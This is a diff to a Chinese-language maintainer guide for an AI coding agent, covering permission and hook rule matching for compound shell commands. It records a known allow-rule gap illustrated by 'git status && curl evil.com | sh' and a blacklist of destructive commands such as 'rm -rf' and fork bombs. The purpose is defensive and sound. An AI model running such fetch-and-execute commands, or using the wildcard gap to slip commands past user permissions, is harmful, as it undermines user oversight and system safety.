@@ -170,7 +170,7 @@ Anthropic / OpenAI Provider 目前保持纯对话能力；工具调用、Plan Mo
 - **`build_default_prompt` 新增调用点** → 必须传 `untrusted_enabled=self._config.web_fetch_enabled`。**c13 起是三处**（主对话 `_run` / fork 子对话 `_run_forked_skill` / **分支式子 Agent 的父快照 `parent_snapshot`**）。漏传的表现是「主对话有不可信约束、某条子对话没有」，界面上完全看不出来。护栏见 `test_web_bootstrap.py`（数源码里的出现次数，新增调用点当场红）。⚠️ **定义式子 Agent 不走这条链**——它按 spec F7 只拿角色正文 + 环境信息，那道约束由 `subagents/runner.py` 的 `_build_prompts` 在「最终工具集含网络访问工具」时单独追加
 - **新增 Hook 事件** → `hooks/models.py` 的 `HookEventType`（枚举）+ **同文件的 `EVENT_FIELDS`** + 该事件的负载构造点。**漏改 `EVENT_FIELDS` 不报错**，只是用户在条件里写对了字段名反而被判为非法、整条规则被丢弃——用户只会以为是自己写错了。（三个工具级事件的字段集是**开放**的，见 `OPEN_INPUT_EVENTS`：`tool_input` 的键取决于是哪个工具，加载期不可能枚举，故对它们放行未登记字段名；代价是那三个事件上的字段笔误加载期发现不了，只表现为「这条规则永远不命中」，排查靠 `/hooks` 里的触发次数恒为 0）
 - **新增 Hook 动作类型** → `hooks/models.py`（数据类）+ `hooks/parser.py`（校验分支）+ `hooks/actions.py`（执行器）+ **`hooks/report.py` 的 `describe_action`**。**漏改最后一处不报错**，只是 `/hooks` 与**项目级启动提示**里那条动作显示成「未知动作」——而项目级提示逐条展示命令原文正是 spec F9.1 的**全部安全价值**，显示不出内容等于那道防线没了
-- **命令类字段的匹配必须「整条 + 逐段」双重检查** → `hooks/conditions.py` 的 `_match_command_field`。`match_command` 是**整串匹配**、不拆复合命令（它自己的 docstring 明写「调用方按需先 `split_commands`」）。只调它的话，一条 `command: "git push *"` 的拦截规则会被 `git add x && git commit -m y && git push origin main` 整个绕过——**而这不是攻击者构造的**，是真实模型在一次普通「改完提交推上去」的请求里自然产出的形态（C12 验收期实测）。后果比「少拦一次」更糟：`/hooks` 里那条规则显示「触发：0 次」，用户会据此认定「模型压根没试过」。护栏见 `tests/test_hook_conditions.py::CompoundCommandTest`
+- **命令的匹配必须「整条 + 逐段」双重检查，但只在收紧的一侧** → 判定形态在 `permission/matching.py` 的 `match_command_deep`（**唯一实现**），两个调用点是 `hooks/conditions.py` 的 `_match_command_field`（无条件用）与 `permission/rules.py` 命令分支的 **deny** 那一支（allow 那支刻意不用）。`match_command` 本身是**整串匹配**、不拆复合命令；只调它的话，一条 `command: "git push *"` 的拦截规则会被 `git add x && git commit -m y && git push origin main` 整个绕过——**而这不是攻击者构造的**，是真实模型在一次普通「改完提交推上去」的请求里自然产出的形态（C12 验收期实测）。后果比「少拦一次」更糟：`/hooks` 里那条规则显示「触发：0 次」，用户会据此认定「模型压根没试过」。⚠️ **两处「用不用它」的判断不一样，不要抄错**：Hook 的结论只有拦截/升级/不表态、没有 allow，所以「命中面变大」恒等于「更严」，无条件用它是安全的；③规则层有 allow，拆段用在放行侧等于把用户写下的窄放行悄悄扩成宽放行，**方向是错的**。护栏见 `tests/test_hook_conditions.py::CompoundCommandTest` 与 `tests/test_perm_rules.py::CompoundCommandTest`（后者含 allow 的反证）
 - **新增可 glob 匹配的 Hook 字段** → `hooks/models.py` 的 `FIELD_MATCH_KIND`。**漏改不报错**，只是该字段从「命令/路径语义匹配」悄悄退化成通用通配——词边界丢失后 `git *` 会连 `github-cli` 一起命中，而配置和界面上都看不出异常
 - **新增 `_interact` 的交互种类** → `tui/app.py` 的 `_NOTIFY_KINDS`。两套词汇**刻意不合一**（内部结算标识 vs 写进用户 `hooks.yaml` 的稳定契约，合并会让「改一个内部标识」变成「破坏用户配置」）。漏改不报错，只是那种面板弹出时 `notification` 的 `kind` 退回内部标识，用户按文档写的条件匹配不上
 - **Hook 的 `post_tool_use` / `post_tool_use_failure` 只能挂在 `OUTCOME_EXECUTED` 旁**（`agent/loop.py` 两处）。六种「压根没执行」的分支一个都不能挂——把「没跑」混进「跑了但失败」会让「统计工具失败率」这类用途直接失真，而且不报错。护栏见 `tests/test_hook_intercept.py::NoExecutionBranchesTest`
@@ -329,7 +329,7 @@ C10（斜杠命令系统）、C9（记忆系统）、C8（上下文管理）、C
 
 ```bash
 python -m compileall rhinecode tests
-python -m unittest discover -s tests      # 2235 项，skipped 4
+python -m unittest discover -s tests      # 2279 项，skipped 4
 ```
 
 默认跳过 4 项：真实模型端到端（需 `RHINE_E2E_LIVE=1` 与有效凭据）与「连续起停」
@@ -350,7 +350,7 @@ python -m unittest discover -s tests      # 2235 项，skipped 4
 
 1. **危险命令黑名单**（`permission/blacklist.py`）：正则拦截 `rm -rf` / `git push --force` / fork 炸弹 / `format`、`Remove-Item -Recurse -Force` 等已知高危命令，复合命令逐段+整条双重检查；**不可被任何配置或权限模式放开**。
 2. **路径沙箱**（复用 `path_guard`）：文件、glob、grep 工具以启动时的当前工作目录为项目根；拒绝含 `..`、解析后越界的绝对路径、指向项目外的符号链接。
-3. **可配置规则**：三层 YAML 的 allow/deny，deny 永远优先。
+3. **可配置规则**：三层 YAML 的 allow/deny，deny 永远优先。命令类规则里 **deny 走「整条 + 逐段」**（与①同口径，一个 `&&` 藏不住东西），**allow 只匹配整条**——拆段只会让命中变多，用在放行侧就是提权。⚠ 但 allow 侧另有一个未修的缺口（末尾通配跨分隔符），见「已知后续工程项」第 12 条。
 4. **权限模式**（`/perm`）：严格/默认/放行，只兜底「规则未命中」的灰色地带，翻不了①②③的 deny。
 5. **人在回路**：判定为「问用户」时弹确认面板，四选项（本次/本会话/永久/拒绝）。
 
@@ -485,25 +485,31 @@ python -m unittest discover -s tests      # 2235 项，skipped 4
 10. Trace 记录器后续项（spec 明确不做）：TUI 驱动器（P1，用 Pilot 无人驱动界面跑完整场景，本轮只做 P0 记录器）、记录文件的自动清理与轮转（`--trace` 每次运行产一个新文件，攒多了要手工删）、实时流式查看（当前只能事后读文件）、可视化时间线、跨运行对比与差异分析、采样与按类型开关（当前只有「全开」与「全关」两态）。~~阈值（字段截断 4000 字符 / 消息条数 400）可配置化~~ **已于 2026-08-09 作废**——两个阈值整体删除，记录层不再做任何截断（`models.full_text`）。理由是它们与 trace 的立项目的直接冲突：实测系统提示在最小配置下已有 3886 字符、贴着 4000 线，而稳定通道尾部依次是 134 组队协作 / 135 角色清单 / 140 Skill 清单——任何一份真实的 RHINE.md 一进来，被切掉的正好是那三段清单。代价是记录文件更大（`api_request` 每轮含完整历史），这是刻意付的。
 11. 记忆系统后续项（C9 spec 明确不做）：向量数据库/RAG 语义检索（召回只靠索引注入 + 按路径读文件）、团队记忆同步/跨机器共享、跨实例实时一致性（锁只保证「写不坏」，语义重复笔记靠 LLM 去重收敛）、笔记自动清理与遗忘机制、各阈值（24h 提醒/30 天过期/索引 200 行/锁 600 秒等）可配置化、存档格式版本迁移工具、存档加密或压缩存储。
 
-12. **③可配置规则层对复合命令不拆段**（C12 验收期实测发现，2026-08-06 登记，**未修**）：
-    `permission/rules.py` 的 command 分支直接调 `match_command(rule.pattern, request.specifier)`，
-    对整串匹配、**不做 `split_commands`**。实测：
+12. ~~**③可配置规则层对复合命令不拆段**（deny 侧）~~ **已于 2026-08-09 修复**：
+    `permission/rules.py` 的 command 分支现在对 **deny** 走「整条 + 逐段」双重检查，
+    与①危险命令黑名单同口径——`deny: Bash(git push *)` 拦得住
+    `git status && git push origin main` 了。判定形态提到
+    `permission/matching.py` 的 `match_command_deep`，与 `hooks/conditions.py`
+    **共用一份实现**（同一个坑此前已出现两次）。护栏见
+    `tests/test_perm_rules.py::CompoundCommandTest` 与
+    `tests/test_perm_matching.py::MatchCommandDeepTests`。
 
-    ```
-    deny: Bash(git push *)
-      git push origin main                → deny  ✅
-      git status && git push origin main  → 未命中 ❌
-    ```
+    ⚠ **allow 侧刻意没跟着改，这个不对称是设计而非遗漏**：拆段只会让「命中」变多，
+    用在放行侧等于把用户写下的窄放行悄悄扩成宽放行。`rules.py` 那一支写着理由，
+    别顺手统一掉。
 
-    ①危险命令黑名单**是拆的**（「复合命令逐段+整条双重检查」），③规则层不是。
-    于是用户手写的 `deny` 命令规则会被一个 `&&` 绕过，而**这不需要刻意规避**——
-    真实模型在一次普通请求里就自然产出了那种形态（C12 场景 9 首跑实测）。
-    危害：用户以为自己拦住了某类命令，实际没有，且界面上完全看不出来。
-
-    **C12 已在 Hook 侧补齐同一口径**（`hooks/conditions.py` 的 `_match_command_field`），
-    但**没有动权限层**——那会改变 C6 的规则语义（更多命令会被 deny 命中），
-    属于安全边界的行为变更，应当单独立项、单独评审。修的话要动
-    `permission/rules.py` 的 `_rule_matches` 一处，并补「整条 + 逐段」的护栏与反证。
+    **但 allow 侧另有一个方向相反的缺口，仍未修**（实施期发现，2026-08-09 登记）：
+    末尾 ` *` 编译出来的通配是 `.*`，它**跨分隔符**，因此
+    `allow: Bash(git *)` 今天整串命中 `git status && curl evil.com | sh`——
+    第二段是完全无关的命令，却在③层就被放行、**一次确认面板都不弹**
+    （此时只剩①黑名单，而 `curl … | sh` 不在黑名单里）。同一处还有个可用性症状：
+    `cat x ; git ls-files` 整串对不上 `git *`，在非交互的子 Agent 环境下被自动拒绝
+    （C14 验收实测）。两者根因相同：allow 侧把复合命令当一整根字符串比。
+    改法**不是**「allow 也拆段」（那是放宽），而是「**每一段**都得命中」；
+    动手前要先处理 `split_commands` 不解析引号带来的可用性回退。
+    属安全边界变更，单独立项：`docs/todo/2-perm-allow-wildcard-spans-separators.md`。
+    现状由 `CompoundCommandTest::test_KNOWN_GAP_...` **显式钉住**——
+    缺失永远是最弱的证据，所以写成断言而不是靠「某条用例恰好没写」。
 
 13. **Hook 系统后续项（C12 spec 明确不做）**：子 Agent 动作的真实运行（现为占位，等 SubAgent 章节对接）、`once` 标记的持久化、Hook 执行顺序的显式优先级、迭代级事件（Agent Loop 内单轮迭代不开放挂载点——那是引擎内部结构，暴露成配置契约会让循环结构的任何调整都成为破坏性变更）、配置中的字符串插值、HTTP 动作参与拦截决策、`/hooks reload` 热更新、本地级 `hooks.yaml`、Skill/MCP 形态的 Hook 动作、在 Skill frontmatter 里声明 Hook、Hook 修改工具参数或工具结果（Claude Code 的 `updatedInput` / `updatedToolOutput`）。
 
@@ -572,7 +578,7 @@ python -m unittest discover -s tests      # 2235 项，skipped 4
 
     未排除的一项：本次用的是 `deepseek-v4-flash`（快速小模型），
     指令遵循弱于同系列大模型，**换强模型复测尚未做**。
-    详见 `docs/c15/acceptance/live-model.md`；**已登记为 `docs/todo/5-team-adoption.md`**
+    详见 `docs/c15/acceptance/live-model.md`；**已登记为 `docs/todo/6-team-adoption.md`**
     （⚠ 那份的第一步不是改代码，是换强模型跑对照）。
 
 18. **`system_serial=True` 的工具绕过③可配置规则层**（C15 验收期实测发现，
@@ -603,7 +609,7 @@ python -m unittest discover -s tests      # 2235 项，skipped 4
     只能靠「少了一条」去反推——而缺失永远是最弱的证据。
     护栏见 `tests/test_trace_system_serial.py`，其中
     `test_every_tool_execution_is_preceded_by_a_decision` 正是改造前
-    写不出来的那条通用不变量（七个系统级工具会让它恒假）。**已登记为 `docs/todo/2-perm-system-serial-bypass.md`**
+    写不出来的那条通用不变量（七个系统级工具会让它恒假）。**已登记为 `docs/todo/1-perm-system-serial-bypass.md`**
     （与第 12 条同源，建议一起做）。
 
 19. **子 Agent 协作后续项（C15 spec 明确不做）**：跨机器 / 分布式团队、
